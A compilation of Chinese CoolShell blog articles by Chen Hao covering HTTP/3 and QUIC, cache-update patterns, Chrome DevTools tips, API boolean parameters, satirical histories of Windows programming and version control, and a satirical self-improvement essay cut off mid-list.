好了，就算搞定上面的东西，还有一些业务层的事没解，这个事就是 HTTP/2的头压缩算法 HPACK，HPACK需要维护一个动态的字典表来分析请求的头中哪些是重复的，HPACK的这个数据结构需要在encoder和decoder端同步这个东西。在TCP上，这种同步是透明的，然而在UDP上这个事不好干了。所以，这个事也必需要重新设计了，基于QUIC的QPACK就出来了，利用两个附加的QUIC steam，一个用来发送这个字典表的更新给对方，另一个用来ack对方发过来的update。目前看下来，HTTP/3目前看上去没有太多的协议业务逻辑上的东西，更多是HTTP/2 + QUIC协议。但，HTTP/3 因为动到了底层协议，所以，在普及方面上可能会比 HTTP/2要慢的多的多。但是，可以看到QUIC协议的强大，细思及恐，QUIC这个协议真对TCP是个威胁，如果QUIC成熟了，TCP是不是会有可能成为历史呢？未来十年，让我们看看UDP是否能够逆袭TCP……(全文完)# 缓存更新的套路作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!cache看到好些人在写更新缓存数据代码时， **先删除缓存，然后再更新数据库** ，而后续的操作会把数据再装载的缓存中。 **然而，这个是逻辑是错误的** 。试想，两个并发操作，一个是更新操作，另一个是查询操作，更新操作删除缓存后，查询操作没有命中缓存，先把老数据读出来后放到缓存中，然后更新操作更新了数据库。于是，在缓存中的数据还是老的数据，导致缓存中的数据是脏的，而且还一直这样脏下去了。
我不知道为什么这么多人用的都是这个逻辑，当我在微博上发了这个贴以后，我发现好些人给了好多非常复杂和诡异的方案，所以，我想写这篇文章说一下几个缓存更新的Design Pattern（让我们多一些套路吧）。这里，我们先不讨论更新缓存和更新数据这两个事是一个事务的事，或是会有失败的可能，我们先假设更新数据库和更新缓存都可以成功的情况（我们先把成功的代码逻辑先写对）。更新缓存的的Design Pattern有四种：Cache aside, Read through, Write through, Write behind caching，我们下面一一来看一下这四种Pattern。目录* Cache Aside Pattern   * Read/Write Through Pattern     * Read Through     * Write Through   * Write Behind Caching Pattern   * 再多唠叨一些#### Cache Aside Pattern这是最常用最常用的pattern了。其具体逻辑如下：* **失效** ：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。
* **命中** ：应用程序从cache中取数据，取到后返回。* **更新** ：先把数据存到数据库中，成功后，再让缓存失效。!Cache-Aside-Design-Pattern-Flow-Diagram!Updating-Data-using-the-Cache-Aside-Pattern-Flow- Diagram-1注意，我们的更新是先更新数据库，成功后，让缓存失效。那么，这种方式是否可以没有文章前面提到过的那个问题呢？我们可以脑补一下。一个是查询操作，一个是更新操作的并发，首先，没有了删除cache数据的操作了，而是先更新了数据库中的数据，此时，缓存依然有效，所以，并发的查询操作拿的是没有更新的数据，但是，更新操作马上让缓存的失效了，后续的查询操作再把数据从数据库中拉出来。而不会像文章开头的那个逻辑产生的问题，后续的查询操作一直都在取老的数据。这是标准的design pattern，包括Facebook的论文《Scaling Memcache at Facebook》也使用了这个策略。为什么不是写完数据库后更新缓存？你可以看一下Quora上的这个问答《Why does Facebook use delete to remove the key-value pair in Memcached instead of updating the Memcached during write request to the backend?》，主要是怕两个并发的写操作导致脏数据。
那么，是不是Cache Aside这个就不会有并发问题了？不是的，比如，一个是读操作，但是没有命中缓存，然后就到数据库中取数据，此时来了一个写操作，写完数据库后，让缓存失效，然后，之前的那个读操作再把老的数据放进去，所以，会造成脏数据。但，这个case理论上会出现，不过，实际上出现的概率可能非常低，因为这个条件需要发生在读缓存时缓存失效，而且并发着有一个写操作。而实际上数据库的写操作会比读操作慢得多，而且还要锁表，而读操作必需在写操作前进入数据库操作，而又要晚于写操作更新缓存，所有的这些条件都具备的概率基本并不大。**所以，这也就是Quora上的那个答案里说的，要么通过2PC或是Paxos协议保证一致性，要么就是拼命的降低并发时脏数据的概率，而Facebook使用了这个降低概率的玩法，因为2PC太慢，而Paxos太复杂。当然，最好还是为缓存设置上过期时间。**#### Read/Write Through Pattern我们可以看到，在上面的Cache Aside套路中，我们的应用代码需要维护两个数据存储，一个是缓存（Cache），一个是数据库（Repository）。所以，应用程序比较啰嗦。而Read/Write Through套路是把更新数据库（Repository）的操作由缓存自己代理了，所以，对于应用层来说，就简单很多了。 **可以理解为，应用认为后端就是一个单一的存储，而存储自己维护自己的Cache。**
##### Read ThroughRead Through 套路就是在查询操作中更新缓存，也就是说，当缓存失效的时候（过期或LRU换出），Cache Aside是由调用方负责把数据加载入缓存，而Read Through则用缓存服务自己来加载，从而对应用方是透明的。##### Write ThroughWrite Through 套路和Read Through相仿，不过是在更新数据时发生。当有数据更新的时候，如果没有命中缓存，直接更新数据库，然后返回。如果命中了缓存，则更新缓存，然后再由Cache自己更新数据库（这是一个同步操作）下图自来Wikipedia的Cache词条)。其中的Memory你可以理解为就是我们例子里的数据库。!Write-through_with_no-write-allocation#### Write Behind Caching PatternWrite Behind 又叫 Write Back。 **一些了解Linux操作系统内核的同学对write back应该非常熟悉，这不就是Linux文件系统的Page Cache的算法吗？是的，你看基础这玩意全都是相通的。** 所以，基础很重要，我已经不是一次说过基础很重要这事了。
Write Back套路，一句说就是，在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。这个设计的好处就是让数据的I/O操作飞快无比（因为直接操作内存嘛 ），因为异步，write backg还可以合并对同一个数据的多次操作，所以性能的提高是相当可观的。但是，其带来的问题是，数据不是强一致性的，而且可能会丢失（我们知道Unix/Linux非正常关机会导致数据丢失，就是因为这个事）。在软件设计上，我们基本上不可能做出一个没有缺陷的设计，就像算法设计中的时间换空间，空间换时间一个道理，有时候，强一致性和高性能，高可用和高性性是有冲突的。软件设计从来都是取舍Trade- Off。另外，Write Back实现逻辑比较复杂，因为他需要track有哪数据是被更新了的，需要刷到持久层上。操作系统的write back会在仅当这个cache需要失效的时候，才会被真正持久起来，比如，内存不够了，或是进程退出了等情况，这又叫lazy write。在wikipedia上有一张write back的流程图，基本逻辑如下：!Write-back_with_write-allocation
#### 再多唠叨一些1）上面讲的这些Design Pattern，其实并不是软件架构里的mysql数据库和memcache/redis的更新策略，这些东西都是计算机体系结构里的设计，比如CPU的缓存，硬盘文件系统中的缓存，硬盘上的缓存，数据库中的缓存。 **基本上来说，这些缓存更新的设计模式都是非常老古董的，而且历经长时间考验的策略** ，所以这也就是，工程学上所谓的Best Practice，遵从就好了。2）有时候，我们觉得能做宏观的系统架构的人一定是很有经验的，其实，宏观系统架构中的很多设计都来源于这些微观的东西。比如，云计算中的很多虚拟化技术的原理，和传统的虚拟内存不是很像么？Unix下的那些I/O模型，也放大到了架构里的同步异步的模型，还有Unix发明的管道不就是数据流式计算架构吗？TCP的好些设计也用在不同系统间的通讯中，仔细看看这些微观层面，你会发现有很多设计都非常精妙……所以， **请允许我在这里放句观点鲜明的话——如果你要做好架构，首先你得把计算机体系结构以及很多老古董的基础技术吃透了** 。3）在软件开发或设计中，我非常建议在之前先去参考一下已有的设计和思路， **看看相应的guideline，best practice或design pattern，吃透了已有的这些东西，再决定是否要重新发明轮子** 。千万不要似是而非地，想当然的做软件设计。
4）上面，我们没有考虑缓存（Cache）和持久层（Repository）的整体事务的问题。比如，更新Cache成功，更新数据库失败了怎么吗？或是反过来。关于这个事，如果你需要强一致性，你需要使用“两阶段提交协议”——prepare, commit/rollback，比如Java 7 的XAResource，还有MySQL 5.7的 XA Transaction，有些cache也支持XA，比如EhCache。当然，XA这样的强一致性的玩法会导致性能下降，关于分布式的事务的相关话题，你可以看看《分布式系统的事务处理》一文。（全文完）# Chrome开发者工具的小技巧作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnChrome的开发者工具是个很强大的东西，相信程序员们都不会陌生，不过有些小功能可能并不为大众所知，所以，写下这篇文章罗列一下可能你所不知道的功能，有的功能可能会比较实用，有的则不一定，也欢迎大家补充交流。话不多话，我们开始。目录* 代码格式化   * 强制DOM状态   * 动画   * 直接编辑网页   * 网络限速   * 复制HTTP请求   * 抓个带手机的图   * 设置断点     * 给DOM设置断点     * 给XHR和Event Lisener设置断点   * 关于Console中的技巧     * DOM操作     * Console中的一些函数     * Console的输出   * 关于console对象   * 关于快捷键
#### 代码格式化有很多css/js的代码都会被 minify 掉，你可以点击代码窗口左下角的那个 **`{ }`** 标签，chrome会帮你给格式化掉。#### 强制DOM状态有些HTML的DOM是有状态的，比如<a> 标签，其会有 active，hover， focus，visited这些状态，有时候，我们的CSS会来定关不同状态的样式，在分析网页查看网页上DOM的CSS样式时，我们可以点击CSS样式上的 **`:hov`** 这个小按钮来强制这个DOM的状态。#### 动画现在的网页上都会有一些动画效果。在Chrome的开发者工具中，通过右上角的菜单中的 `More Tools` => `Animations` 呼出相关的选项卡。于是你就可以慢动作播放动画了（可以点选 `25%` 或 `10%`），然后，Chrome还可以帮你把动画录下来，你可以拉动动再画的过程，甚至可以做一些简单的修改。#### 直接编辑网页在你的 console 里 输入下面的命令：`document.designMode = "on" `于是你就可以直接修改网页上的内容了。P.S. 下面这个抓屏中还演示了一个如何清空console的示例。你可以输入 clear() 或是 按 `Ctrl+L`（Windows下），`CMD + K` (Mac下)
#### 网络限速你可以设置你的网络的访问速度来模拟一个网络很慢的情况。#### 复制HTTP请求这个是我很喜欢 的一个功能，你可以在 network选项卡里，点击 XHR 过滤相关的Ajax请求，然后在相关的请求上点鼠标右键，在菜单中选择： `Copy` => `Copy as cURL`，然后就可以到你的命令行下去 执行 `curl` 的命令了。这个可以很容易做一些自动化的测试。**友情提示：这个操作有可能会把你的个人隐私信息复制出去，比如你个人登录后的cookie。**#### 抓个带手机的图这个可能有点无聊了，不过我觉得挺有意思的。在device显示中，先选择一个手机，然后在右上角选 `Show Device Frame`，然后你就看到手机的样子了，然后再到那个菜中中选 Capture snapshot，就可以抓下一个有手机样子的截图了。我抓的图如下（当然，不是所有的手机都有frame的）#### 设置断点除了给Javascript的源代码上设置断点调试，你还可以：##### 给DOM设置断点选中一个DOM，然后在右键菜单中选 Break on … 你可以看到如下三个选项：####
##### 给XHR和Event Lisener设置断点在 Sources 面页中，你可以看到右边的那堆break points中，除了上面我们说的给DOM设置断点，你还可以给XHR和Event Listener设置断点，载图如下：#### 关于Console中的技巧##### DOM操作* chrome会帮你buffer 5个你查看过的DOM对象，你可以直接在Console中用 $0, $1, $2, $3, $4来访问。* 你还可以使用像jQuery那样的语法来获得DOM对象，如：`$("#mydiv")`* 你还可使用 `$$(".class")` 来选择所有满足条件的DOM对象。* 你可以使用 `getEventListeners($("selector"))` 来查看某个DOM对象上的事件（如下图所示）。* 你还可以使用 `monitorEvents($("selector"))` 来监控相关的事件。比如：`monitorEvents(document.body, "click");`##### Console中的一些函数**1）monitor函数**使用 monitor函数来监控一函数，如下面的示例
**2）copy函数**copy函数可以把一个变量的值copy到剪贴板上。**3）inspect函数**inspect函数可以让你控制台跳到你需要查看的对象上。如：更多的函数请参数官方文档 – Using the Console / Command Line Reference##### Console的输出我们知道，除了`console.log`之外，还有`console.debug`，`console.info`，`console.warn`，`console.error`这些不同级别的输出。另外一个鲜为人知的功能是，`console.log`中，你还可以对输出的文本加上css的样式，如下所示：`console.log("%c左耳朵", "font-size:90px;color:#888")`于是，你可以定义一些相关的log函数，如：关于console.log中的格式化，你可以参看如下表格：指示符 | 输出   ---|---   %s | 格式化输出一个字符串变量。   %i or %d | 格式化输出一个整型变量的值。   %f | 格式化输出一个浮点数变量的值。   %o | 格式化输出一个DOM对象。   %O | 格式化输出一个Javascript对象。   %c | 为后面的字符串加上CSS样式
除了console.log打印js的数组，你还可以使用console.table来打印，如下所示：#### 关于console对象* console对象除了上面的打日志的功能，其还有很多功能，比如：   * console.trace() 可以打出js的函数调用栈   * console.time() 和 console.timeEnd() 可以帮你计算一段代码间消耗的时间。   * console.profile() 和 console.profileEnd() 可以让你查看CPU的消耗。   * console.count() 可以让你看到相同的日志当前被打印的次数。   * console.assert(expression, object) 可以让你assert一个表达式这些东西都可以看看Google的Console API的文档。其实，还有很多东西，你可以参看Google的官方文档 – Chrome DevTools#### 关于快捷键点击在 DevTools的右上角的那三个坚排的小点，你会看到一个菜单，点选 `Shortcuts`，你就可以看到所有的快捷键了如果你知道更多，也欢迎补充！
（全文完）# Titanium – 桌面和移动应用开发平台作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn_文章来源 www.readwriteweb.com_ _   _2010年3月8日，Appcelerator 公司发布了 Titanium 的 1.0 版本。 Titanium 是一个桌面和移动应用程序开发平台，基于此平台，开发人员可以使用标准的 WEB 技术如 HTML，JavaScript，和 CSS 来开发桌面和移动应用程序。和其他开发平台所宣传的开发移动应用无需理解本机代码不同， Titanium 允许开发人员使用他们熟悉的编程技术来开发本机（native）移动应用，同时效果和功能与那些使用平台特定语言编写的应用相同，如可以操纵内置相机、播放视频流等等。 Titanium 的产品代码在近几个月内得到了优化，在性能方面得到了多处改进，加载时间由原来的10-20秒下降为3秒，页面切换非常迅速，处理速度提高了5倍。同时还增加了一些新的功能，如超过100个本机界面控件，2D 和 3D 动画及媒体处理机能。有了这些方面的增强，开发人员可以在 Titanium 支持的平台上开发品牌化应用， 休闲游戏， 以及增强现实应用。
当被问到 Titanium 与其他开发平台的不同之处在哪里时，公司的营销副总裁 Scott Schwarzhoff 解释道：“很多我们的竞争者经仅仅是将 WEB 应用曲解为本机应用提供给客户，而没有提供真正的本机应用解决方案”。提供本机界面（超过100个本机API）的只有我们一家公司，同时我们还提供推通知服务，本机地图，Facebook连接，应用数据分析，增强现实应用，将来还会有更多特性。自2009年6月以来，Titanium 开发平台吸引了超过27000名开发人员对公司所谓“本机优势”概念的兴趣（ _阅读详情_ ）。其中包括对本机控件的支持，基于位置的服务，社交共享，HTML 5，在线和设备内置数据库，集成数据分析，丰富的多媒体等等。Appcelerator 承诺在3月份的第三周支持苹果的新平板设备，包括几周后即将发布的 iPad。对黑莓的支持将于五月或六月间发布。Titanium 的社区版本完全免费，专业版本不免费，但是提供技术支持，数据分析以及对新版本的预览。Titanium 支持的平台包括： PC， Mac，Linux，最新版本则支持 iPhone 和 Android，Appcelerator 公司即将发布对黑莓和苹果 iPad 的支持。
# 千万不要把 bool 设计成函数参数作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们有很多Coding Style 或 代码规范。但这一条可能会经常被我们所遗忘，就是我们经常会在函数的参数里使用bool参数，这会大大地降低代码的可读性。不信？我们先来看看下面的代码。当你读到下面的代码，你会觉得这个代码是什么意思？`widget->repaint(false);`是不要repaint吗？还是别的什么意思？看了文档后，我们才知道这个参数是immediate， 也就是说，false代表不立即重画，true代码立即重画。Windows API中也有这样一个函数：InvalidateRect，当你看到下面的代码，你会觉得是什么意思？`InvalidateRect(hwnd, lpRect, false);`我们先不说InvalidateRect这个函数名取得有多糟糕，我们先说一下那个false参数？invalidate意为“让XXX无效”，false是什么意思？双重否定？是肯定的意思？如果你看到这样的代码，你会相当的费解的。于是，你要去看一下文档，或是InvalidateRect的函数定义，你会看到那个参数是 **BOOL** _bErase_ ，意思是，是否要重画背景。
这样的事情有很多，再看下面的代码，想把str中的”%USER%”替换成真实的用户名：`str.replace("%USER%", user, false); // Qt 3`TNND，那个false是什么意思？不替换吗？还是别的什么意思，看了文档才知道，false代码大小写不敏感的替换。其实，如果你使用枚举变量/常量，而不是bool变量，你会让你的代码更易读，如：widget->repaint(PAINT::immediate);     widget->repaint(PAINT::deffer);InvalidateRect(hwnd, lpRect,  !RepantBackground);str.replace("%USER%", user, Qt::CaseInsensitive); // Qt 4如果对这个事不以为然的话，我们再来看一些别的示例，你不妨猜猜看看下面的代码：`component.setCentered(true, false);`这什么玩意儿啊？看了文档你才知道，这原来是 setCentered(centered, autoUpdate);`new Textbox(300, 100, false, true);`
这又是什么啊？看了文档才知道，这是创建一个文本框，第三个参数是是否要滚动条，第四个是是否要自动换行。TNND。上面的情况还不算最差，看看下面的双重否定。component.setDisabled(false);     filter.setCaseInsensitive(false)再来一个，如果你读到下面的代码，相信你会和我一样，要么石化了，要么凌乱了。event.initKeyEvent("keypress", true, true, null, null,     false, false, false, false, 9, 0);看完这篇文章，我希望你再也不要把bool为作为函数参数了。除非两个原因：1. 你100%确认不会带来阅读上的问题，比如Java的 setVisible (bool).   2. 你100%确认你想去写出无法维护很难阅读的代码。【更新2011/9/8】当然，别的参数也会有一样的问题，比如：`new Textbox(300, 100, false, true);`中的300 和 100，不知道是坐标还是长宽，只不过，一般长度或坐标这样的参数都不会被hard code，都会有变量名，而bool这种参数经常性地被传成true 和 false。 bool参数表现得更为明显一些罢了。
所以，程序中不要出现magic number，true/false 也是一种 magic number。但是，我想告诉大家，从API设计的角度来说，你无法强制调用者用常量来取代true/false，定义成枚举类型是最好的选择。最后，如果你想设计一个好的API，强烈推荐你读一下Nokia的Qt的《API Design Principles》，本文就是其中的“Boolean Trap”。（全文完）# Windows编程革命简史作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn源文：A Brief History of Windows Programming Revolutions （Ron Burk）首先，是 Windows API 和 DLL Hell。（译注：DLL Hell——DLL灾难，就是微软的DLL升级时因为不同版本可能造成应用程序无法运行的灾难，首当其冲的是COM编程，相信大家都知道某些木马或是病毒更改了一些系统的DLL可以导致整个Windows不举，这就是DLL Hell） 于是，第一次革命是DDE——我们可以创建一个状态条在上面显示Microsoft的股票价格（译注：Dynamic Data Exchange，工作原理是： 甲方申请一块全局内存，然后把内存指针postmessage到乙方，乙方根据收到的指针访问那块全局内存）。
在那个时候，Microsoft 创建了 VERSIONINFO 资源来管理版本信息，当然，是用来消除DLL Hell。但是，另一个微软内部的小组发现了DDE的致命缺陷：这不是他们做的！为了解决这个问题，他们创造了OLE（很像DDE，只是名字不一样），而且，我还记得在一次 Microsoft 大会上，某个微软的演讲者正式宣布—— Windows API 马上就会被 OLE API 所重写并取代，我还盲目地相信了这一说法。而且，所有的在图形界面的控件都会是OCX，那是OLE引入的接口，同样，其目的是为了消除DLL Hell。相信大家都记得，那个时候，我们是怎么地梦想着有一天，我们的应用程序（当然是非常大的程序）可以完全地被嵌入到Word文档中。然而，在Microsoft的某处，Microsoft有些人开始信仰 C++，其确信MFC的出现并可以解决所有的一切问题，但是，因为历史原因，OLE并没有出局，其改了一个名字，叫COM，此时，我们立马意识到OLE（以前的DDE？）真正意味着什么——其用精心的版本管理系统来消除DLL Hell。与此同时，Microsoft的一个变节小组发现了一个MFC的致命缺陷：这不是他们做的！
当然，微软件的动作是很快的，他们立刻修正了问题——创造了ATL，有些像MFC，只是名字不同，他们想使用漂亮的ATL把那些晦涩难懂的COM的知识给隐藏住。这个动作刺激了COM团队（或是OLE团队？）改名为ActiveX，并发布了成千上万的新接口（甚至是很多版本化的接口，当然，主要目的是为了消除DLL Hell），当然，ActiveX可以让我们的程序可以从Web游览器上下载，并可以完美地和病毒一起嵌入浏览器中（哈，还不紧跟时代，感谢ATL吧）。此时，操作系统团队就像一个失宠的孩子一样，大声呼喊着“Cairo操作系统来了”引起大家注意，当然有一些怪异恶心的东西连他们自己也无法解释清楚，所以，别提发布了。为了声誉，操作系统团队的确引入了“系统文件保护”的理念，当然也是为了消除DLL Hell。这个时候，Microsoft的某个团队发现了Java的致命缺陷：这不是他们做的！于是他们创造了一个叫J，或是Jole，或是ActiveJ的东西（对不起，我真的记不起叫什么了）来挽救Java（译者：应该是Visual J++）。看起来很像Java，只是名字不同罢了。这太让人兴奋了，但是Sun使用了一些相当古老的法律条款向Microsoft提起了法律诉讼，其在一年内限制了任何一个公司可以发布类似Java的产品。这明显是抑制微软复制别人产品的一次尝试，唯一不同的，其结果导致了微软流向国会议员裤兜的现金网络的建立（在这个网络可以得到时事新闻和价值$14.75的T恤衫）。还记得 J/Jole/ActiveJ 的项目经理用他的鞋桌在敲着桌子并信誓旦旦地坚持 Microsoft 将永远不会放弃他的产品。SB！所有的这些也就仅仅意味着一件事——没有人关心ActiveX团队（或者是COM？）。令人难以置信的是，微软把这些东东全部集成起来，成了COM+（难道不应该是ActiveX+?），还有MTS（我不知道为什么没有COM和Active或是X或是+的字眼，而直接叫MTS了——我为这个名词感到实实在在地震惊！）。他们总是那么NB地为那些流行词加上“+”号。在那段时间，还有人曾叫喊着“Windows DNA”以及“Windows Washboard”，但这两个东西最终在我搞清是什么玩意的之前就夭折了。
在这一点上，Microsoft已经很不安地窥视着Internet好几年了，他们终于意识到Internet上有一个致命缺陷：嗯，你应该知道这是什么（译注：Internet不是做他们做的！）。于是他们开始培养我们和.NET约会（.NET的发音很像“doughnut”圆环图，不过，这只是他们的唯一不同），这和Internet很相似，只不过.NET有更多的印刷品。其让我们清楚再清楚地了解一件事：.NET会消除DLL Hell。.NET包含了一个新的编程语言，叫C#（为了解决已经死翘翘的Active++ J++的缺陷）。.NET还包含一个虚拟机，所有的语言都运行在上面（这主要是为了解决依赖于Intel CPU的缺陷）。.NET还包含了一个单一的登录系统（这主要是为了解决“不把口令存放在Microsoft服务器上”的缺陷）。实际上，我们更容易做的是把.NET不包含的事给列出来。.NET绝对是一个划时代地Windows编程革命……当然，仅到明年。（全文完）# 版本管理器的发展史作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前本站发布过编程语言进化，Windows的达尔文进化图，今天在网上看到版本管理器的进化图，转过来，源文链接如下：
http://codicesoftware.blogspot.com/2010/11/version-control- timeline.html (墙)这张图上分成了四个时期：**史前时期** ：1982年的RCS。现在你可能还能在Unix的发布包中找到它。**古典时期** ：1990年的CVS（经典的SCM管理器，可惜不能track目录和文件名的改变，今天这个东西已经过时了），1985年的PVCS，1992年的clearcase（价格贵，功能复杂，当然，今天也有很多公司在用），微软的VSS（Welcome to Hell），90年代中期的Perforce(P4，这个工具今天都还在被广泛地使用，尤其是那些中等大小却有着大量开发团队的公司，现在是Google内部最大的代码管理器)。**中世纪时期** ：SVN（Linus很不喜欢SVN，2006年引入了Git），AccuRev(强力支持branch和merge，其扮演了一个很重要角色帮助社区脱离clearcase和CVS)，**文艺复兴时期** ：BitKeeper——Sun的内部管理工具，Linux的内核代码2002年也用这个工具，其实，很多开源工程都在用这个工具，2005年这个工具的东家BitMover对大家对BitKeeper逆向工程很不满，于是停止支持开源，于是出现了Git。
Git的第一个版本是Linux之父Linus Torvalds亲手操刀设计和实现的（据说只用了一个周末），Linus不仅仅给出一个原始设计（简单的、干净的、天才的），同时，他也用自己那独一无二的风格催生了这个项目（请参看： http://codicesoftware.blogspot.com/2007/05/linus-torvalds-on-git-and- scm.html 还是被墙）。在Linus介绍Git的著名的演讲中，他强烈地批评（好吧，应该算是侮辱）了CVS，SVN，和Perforce：“Subversion是史上最毫无意义的项目，从项目开始就是这样了”，“如果你喜欢CVS，那么你现在应该在某个精神病研究中心或是别的地方”，“别在用Preforce了，它是十分糟糕和可悲的，这绝对绝对是真的”。无论是反对还是喜欢，Linus的确是改变了历史——中世纪已经过去了，现在的世界由分布式系统主宰，以及消除branch和merge的恐惧。Git 基于 DAG 结构 (Directed Acyclic Graph)，其运行起来相当的快。在Git发布后的来年，世界上所有的大型的开源项目全部从Subversion迁移到了Git上，www.github.com真是很大，这可能是这具星球上最强大最牛最酷的SCM系统了。Git可能并不是最简单的，但它一定会是未来十年的主流。（有空读读这本书——Git Internals）
Mercurial (Hg) 第一次出现在2005年4月，也是因为BitKeeper不免费了。Hg可以和Git在一起使用，见：。但是Hg和Git在设计上不一样，他们对提交/变更的概念是一样的，只不过Git用tree来实现，而Hg则是用扁平的文件和目录来实现（revlog），设计细节可参看：和 。Darcs (Darcs Advanced Revision Control System)是另一个让你摆脱Subversion和CVS的工具，2002年开始，今年是2.5版。它的优势是性能，以及他与众不同的历史版本管理——管理patches而不是snapshot（提交/修改），当然，这样一来，历史改变看上去很不好懂。Bazaar (bzr) 是另一个开源的 DVCS，它试图给SCM的世界里带来一些新的东西。其由Canonical开发（Ubuntu的那个公司），在2008年成为GNU。Plastic在2006年出现，强力地支持branch和merge，其还提供了强大的图示，包括3D的版本树，Plastic主要是为了让中等开发团队使用，介于大型的团队（ClearCase）和小型的团队（Subversion）之间。
Team Foundation Server (TFS)，微软的新一代SCM工具，主要是为了VSS的失败负责，但是他还不是版本管理上还是很强，只不过，他集成了一大堆各种各样的工具，比如：issue tracking，test management等。（全文完）# 如何超过大多数人作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn当你看到这篇文章的标题，你一定对这篇文章产生了巨大的兴趣，因为你的潜意识在告诉你，这是一本人生的“武林秘籍”，而且还是左耳朵写的，一定有干货满满，只要读完，一定可以练就神功并找到超过大多数人的快车道和捷径……然而…… 当你看到我这样开篇时，你一定会觉得我马上就要有个转折，告诉你这是不可能的，一切都需要付出和努力……然而，你错了，这篇文章还真就是一篇“秘籍”，只要你把这些“秘籍”用起来，你就一定可以超过大多数人。而且，这篇文章只有我这个“人生导师”可以写得好。毕竟，我的生命过到了十六进制2B的年纪，踏入这个社会已超过20年，舍我其谁呢？！P.S. 这篇文章借鉴于《如何写出无法维护的代码》一文的风格……嘿嘿目录* 相关技巧和最佳实践   * 相关原理和思维模型     * 认知     * 知识     * 技能     * 领导力
#### 相关技巧和最佳实践要超过别人其实还是比较简单的，尤其在今天的中国，更是简单。因为，你只看看中国的互联网，你就会发现，他们基本上全部都是在消费大众，让大众变得更为地愚蠢和傻瓜。 **所以，在今天的中国，你基本上不用做什么，只需要不使用中国互联网，你就很自然地超过大多数人了** 。当然，如果你还想跟他们彻底拉开，甩他们几个身位，把别人打到底层，下面的这些“技巧”你要多多了解一下。在信息获取上，你要不断地向大众鼓吹下面的这些事：* 让大家都用百度搜索引擎查找信息，订阅微信公众号或是到知乎上学习知识……要做到这一步，你就需要把“百度一下”挂在嘴边，然后要经常在群或朋友圈中转发微信公众号的文章，并且转发知乎里的各种“如何看待……”这样的文章，让他们爱上八卦，爱上转发，爱上碎片。   * 让大家到微博或是知识星球上粉一些大咖，密切关注他们的言论和动向……是的，告诉大家，大咖的任何想法一言一行都可以在微博、朋友圈或是知识星球上获得，让大家相信，你的成长和大咖的见闻和闲扯非常有关系，你跟牛人在一个圈子里你也会变牛。   * 把今日头条和抖音这样的APP推荐给大家……你只需要让你有朋友成功地安装这两个APP，他们就会花大量的时间在上面，而不能自拔，要让他们安装其实还是很容易的，你要不信你就装一个试玩一会看看（嘿嘿嘿）。   * 让大家热爱八卦，八卦并不一定是明星的八卦，还可以是你身边的人，比如，公司的同事，自己的同学，职场见闻，社会热点，争议话题，……这些东西总有一些东西会让人心态有很多微妙的变化，甚至花大量的时间去搜索和阅读大量的观点，以及花大量时间与人辩论争论，这个过程会让人上瘾，让人欲罢不能，然而这些事却和自己没有半毛钱关系。你要做的事就是转发其中一些SB或是很极端的观点，造成大家的一睦讨论后，就早早离场……   * 利用爱国主义，让大家觉得不用学英文，不要出国，不要翻墙，咱们已经是强国了……这点其实还是很容易做到的，因为学习是比较逆人性的，所以，只要你鼓吹那些英文无用论，出国活得更惨，国家和民族都变得很强大，就算自己过得很底层，也有大国人民的感觉。
然后，在知识学习和技能训练上，让他们不得要领并产生幻觉* 让他们混淆认识和知识，以为开阔认知就是学习，让他们有学习和成长的幻觉……   * 培养他们要学会使用碎片时间学习。等他们习惯利用碎片时间吃快餐后，他们就会失去精读一本书的耐性……   * 不断地给他们各种各样“有价值的学习资料”，让他们抓不住重点，成为一个微信公众号或电子书“收藏家”……   * 让他们看一些枯燥无味的基础知识和硬核知识，这样让他们只会用“死记硬背”的方式来学习，甚至直接让他们失去信心，直接放弃……   * 玩具手枪是易用的，重武器是难以操控的，多给他们一些玩具，这样他们就会对玩具玩地得心应手，觉得玩玩具就是自己的专业……   * 让他们喜欢直接得到答案的工作和学习方式，成为一个伸手党，从此学习再也不思考……   * 告诉他们东西做出来就好了，不要追求做漂亮，做优雅，这样他们就会慢慢地变成劳动密集型……   * 让他们觉得自己已经很努力了，剩下的就是运气，并说服他们去‘及时行乐’，然后再也找不到高阶和高效率学习的感觉……   * 让他们觉得“读完书”、“读过书”就行了，不需要对书中的东西进行思考，进行总结，或是实践，只要囫囵吞枣尽快读完就等同于学好了……
最后，在认知和格局上，彻底打垮他们，让他们变成韭菜。* 让他们尽可能地用拼命和加班，尽可能的996，并告诉他们这就是通往成功的唯一路径。这样一来，他们必然会被永远困在低端成为最低的劳动力。   * 让他们不要看到大的形势，只看到眼前的一亩三分地，做好一个井底之蛙。其实这很简单，就是不要告诉他还有另外一种活法，不要扩大他的认识……   * 宣扬一夜暴富以及快速挣钱的案例，最好让他们进入“赌博类”或是“传销类”的地方，比如：股市、数字货币……要让他们相信各种财富神话，相信他们就是那个幸运儿，他们也可以成为巴菲特，可以成为马云……   * 告诉他们，一些看上去很难的事都是有捷径的，比如：21天就能学会机器学习，用区块链就能颠覆以及重构整个世界等等……   * 多跟他们讲一些小人物的励志的故事，这样让他们相信，不需要学习高级知识，不需要掌握高级技能，只需要用低等的知识和低级的技能，再加上持续不断拼命重复现有的工作，终有一天就会成功……   * 多让他们跟别人比较，人比人不会气死人，但是会让人变得浮躁，变得心急，变得焦虑，当一个人没有办法控制自己的情绪，没有办法让自己静下心来，人会失去耐性和坚持，开始好大喜欢功，开始装逼，开始歪门邪道剑走偏锋……   * 让他们到体制内的一些非常稳定的地方工作，这样他们拥有不思进取、怕承担责任、害怕犯错、喜欢偷懒、得过且过的素质……   * 让他们到体制外的那些喜欢拼命喜欢加班的地方工作，告诉他们爱拼才会赢，努力加班是一种福报，青春就是用来拼的，让他们喜欢上使蛮力的感觉……   * 告诉他们你的行业太累太辛苦，干不到30岁。让他们早点转行，不要耽误人生和青春……   * 当他们要做决定的时候，一定要让他们更多的关注自己会失去的东西，而不是会得到的东西。培养他们患得患失心态，让他们认识不到事物真正的价值，失去判断能力……（比如：让他们觉得跟对人拍领导的马屁忠于公司比自我的成长更有价值）   * 